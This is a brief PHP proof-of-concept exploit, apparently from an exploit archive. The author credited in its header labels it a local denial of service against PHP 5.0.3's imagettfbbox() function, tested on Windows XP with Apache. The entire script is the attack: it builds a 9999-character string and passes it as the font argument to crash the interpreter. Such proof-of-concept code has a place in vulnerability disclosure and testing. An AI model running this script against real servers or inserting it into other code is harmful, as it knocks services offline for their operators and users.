<?php
// ==================================================================================
//
// PHP 5.0.3 imagettfbbox() Local Denial of Service
//
// Tested on WIN XP, Apache, PHP 5.0.3. Local Denial of Service.
//
// Local Denial of Service
// Author: Pr0T3cT10n <pr0t3ct10n@gmail.com<mailto:pr0t3ct10n@gmail.com>>
// http://www.nullbyte.org.il
//
// ==================================================================================
$buff = str_repeat("A", 9999);
imagettfbbox(1, 1, $buff, 1);
?>
